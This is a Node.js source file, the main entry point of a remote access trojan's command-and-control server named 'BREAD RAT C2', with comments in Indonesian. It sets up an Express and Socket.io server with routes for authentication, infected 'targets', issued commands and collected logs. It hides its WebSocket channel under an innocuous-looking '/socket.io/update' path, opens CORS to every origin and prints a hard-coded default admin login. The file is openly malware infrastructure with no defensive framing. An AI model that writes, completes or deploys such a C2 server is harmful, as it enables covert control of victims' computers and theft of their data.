// ================================================================
// BREAD RAT C2 - SERVER UTAMA (MODULAR)
// ================================================================
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const path = require('path');
const { initDatabase } = require('./routes/db');   // kita buat di routes/db.js (akan aku berikan)
const authRoutes = require('./routes/auth');
const targetsRoutes = require('./routes/targets');
const commandsRoutes = require('./routes/commands');
const logsRoutes = require('./routes/logs');
const socketHandler = require('./socket/handler');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: '*' },
    path: '/socket.io/update'
});

// Middleware
app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));

// Routes
app.use('/api/auth', authRoutes);
app.use('/api/targets', targetsRoutes);
app.use('/api/commands', commandsRoutes);
app.use('/api/logs', logsRoutes);

// WebSocket
socketHandler(io);

// Database initialization
(async () => {
    await initDatabase();
    const PORT = process.env.PORT || 3000;
    server.listen(PORT, '0.0.0.0', () => {
        console.log(`🍞 BREAD RAT C2 running on port ${PORT}`);
        console.log(`📡 WebSocket path: /socket.io/update`);
        console.log(`👤 Default login: admin / BreadRAT2025!`);
    });
})();

// Error handling
process.on('uncaughtException', (e) => console.error('Uncaught:', e));
process.on('unhandledRejection', (e) => console.error('Rejection:', e));
